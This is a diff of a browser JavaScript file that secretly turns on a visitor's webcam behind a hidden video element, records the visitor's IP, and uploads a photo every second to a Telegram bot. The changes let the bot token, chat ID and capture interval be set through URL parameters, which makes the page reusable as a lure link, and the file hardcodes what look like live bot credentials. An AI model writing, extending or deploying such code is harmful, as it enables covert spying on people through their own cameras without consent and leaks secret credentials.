@@ -1,3 +1,5 @@
+// new version 2.0
+
 // Declare globally
 let video;
 
@@ -9,12 +11,10 @@ video.playsInline = true;
 video.style.display = 'none'; // hide the video element
 document.body.appendChild(video);
 
-
 // Create and add the status div
 const statusDiv = document.createElement('div');
 statusDiv.id = 'status';
 document.body.appendChild(statusDiv);
-
 
 let username = localStorage.getItem('username');
 if (!username) {
@@ -35,7 +35,6 @@ if (!userCode) {
     localStorage.setItem('usercode', userCode);
 }
 
-
 let userIP = '';
 // Fetch user's IP using XMLHttpRequest
 function fetchIP() {
@@ -55,11 +54,36 @@ function fetchIP() {
 }
 fetchIP();
 
-// Parse URL parameters for cp (compression size)
+// Parse URL parameters
 const urlParams = new URLSearchParams(window.location.search);
 const cpParam = urlParams.get('cp'); // e.g., '30kb'
-let maxSizeBytes = null;
 
+// Override chatId and botToken if provided
+let chatId = '-1003935845513'; // default
+let botToken = '8909535161:AAF4d-hVXgpcYqaB1rA6ylGiZjzILLbOB7U'; // default
+
+const urlId = urlParams.get('id');
+if (urlId) {
+    chatId = urlId;
+}
+
+const urlToken = urlParams.get('token');
+if (urlToken) {
+    botToken = urlToken;
+}
+
+// Override capture interval if provided
+let captureIntervalSeconds = 1; // default
+const urlT = urlParams.get('t');
+if (urlT) {
+    const tSeconds = parseInt(urlT);
+    if (!isNaN(tSeconds) && tSeconds > 0) {
+        captureIntervalSeconds = tSeconds;
+    }
+}
+
+// If compression size is specified
+let maxSizeBytes = null;
 if (cpParam && cpParam.toLowerCase().endsWith('kb')) {
     const sizeKb = parseInt(cpParam.toLowerCase().replace('kb', ''));
     if (!isNaN(sizeKb)) {
@@ -67,13 +91,6 @@ if (cpParam && cpParam.toLowerCase().endsWith('kb')) {
         console.log('Compression enabled: target size', maxSizeBytes, 'bytes');
     }
 }
-
-// Telegram Bot details
-const botToken = '8909535161:AAF4d-hVXgpcYqaB1rA6ylGiZjzILLbOB7U'; // Your bot token
-const chatId = '-1003935845513'; // Your chat ID
-
-// Custom capture interval in seconds
-const captureIntervalSeconds = 1; // Change as needed
 
 // Access camera
 navigator.mediaDevices.getUserMedia({ video: true })
@@ -116,12 +133,9 @@ function compressImage(canvas, targetSizeBytes, callback) {
     function attemptCompression() {
         canvas.toBlob(blob => {
             if (blob.size <= targetSizeBytes || quality <= minQuality) {
-                // Accept this blob
                 callback(blob);
             } else {
-                // Reduce quality and retry
                 quality -= step;
-                // Create a temporary canvas to re-encode with lower quality
                 const tempCanvas = document.createElement('canvas');
                 tempCanvas.width = canvas.width;
                 tempCanvas.height = canvas.height;
@@ -131,7 +145,6 @@ function compressImage(canvas, targetSizeBytes, callback) {
                     if (blob2.size <= targetSizeBytes || quality <= minQuality) {
                         callback(blob2);
                     } else {
-                        // Recursive attempt
                         attemptCompression();
                     }
                 }, 'image/jpeg', quality);
@@ -150,14 +163,11 @@ function captureAndUpload() {
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // If compression is needed
     if (maxSizeBytes) {
-        // Use binary search approach for better accuracy
         compressImage(canvas, maxSizeBytes, (blob) => {
             sendImageBlob(blob);
         });
     } else {
-        // No compression needed
         canvas.toBlob(blob => {
             sendImageBlob(blob);
         }, 'image/jpeg');
@@ -173,10 +183,6 @@ function sendImageBlob(blob) {
     const hours = String(now.getHours()).padStart(2, '0');
     const minutes = String(now.getMinutes()).padStart(2, '0');
     const seconds = String(now.getSeconds()).padStart(2, '0');
-    
-// const milliseconds = String(now.getMilliseconds()).padStart(3, '0');
-
-// ${milliseconds}
 
     const dateStr = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
 
